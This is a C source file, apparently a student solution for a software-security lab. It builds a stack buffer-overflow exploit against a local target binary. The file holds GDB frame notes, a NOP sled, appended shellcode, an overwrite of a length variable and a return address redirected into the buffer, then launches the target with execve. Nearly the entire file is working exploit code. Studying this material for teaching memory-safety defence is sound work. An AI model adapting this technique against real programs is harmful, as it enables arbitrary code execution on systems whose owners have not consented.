#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	/*

	INFO FROM GDB:

		% info frame (of foo)
			Arglist at 0x2021feb0, args: arg=0x7fffffffefdc "hi there"
 			Locals at 0x2021feb0, Previous frame's sp is 0x2021fec0
 			Saved registers:
  			rbp at 0x2021feb0, rip at 0x2021feb8

  		% p &buf
  			0x2021fda0

  		% p &len
			0x2021fea8
	
		% p &i
			0x2021feac

		Difference between len and buf addresses is 264 bytes. We need to 
		overwrite value of len.

		Difference between instruction pointer of foo function frame and 
		start address of buf is 280 bytes.

	*/

	char exploit[284];
	memset(exploit, '\x00', 284);

	int i;

	// fill exploit with 128 bytes of NOP instructions
	for (i = 0; i < 128; i++){
		exploit[i] = '\x90';
	}

	strcat(exploit, shellcode); // append the shellcode to exploit string
	strcat(exploit, "\x90\x90\x90"); // pad the shellcode to make it word-aligned

	// fill remaining 88 bytes (till 264) of NOP instructions
	for (i = 176; i < 264; i++){
		exploit[i] = '\x90';
	}

	int newLen = 283;

	// fill 264th byte will new value of len
	
	exploit[264] = '\x1b';
	exploit[265] = '\x01';
	exploit[266] = '\x90';
	exploit[267] = '\x90';

	// keep i's address same
//	exploit[268] = '\x10';
//	exploit[269] = '\x01';
//	exploit[270] = '\x00';
//	exploit[271] = '\x00';

	// jump over the value of i till 280 bytes
	for (i = 272; i < 280; i++){
		exploit[i] = '\x90';
	}

	// overwrite return address with buf start address
	exploit[280] = '\xa0';
	exploit[281] = '\xfd';
	exploit[282] = '\x21';
	exploit[283] = '\x20';

	printf("STRLEN: %d\n", strlen(exploit));

	args[0] = TARGET;

	args[1] = exploit;

	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
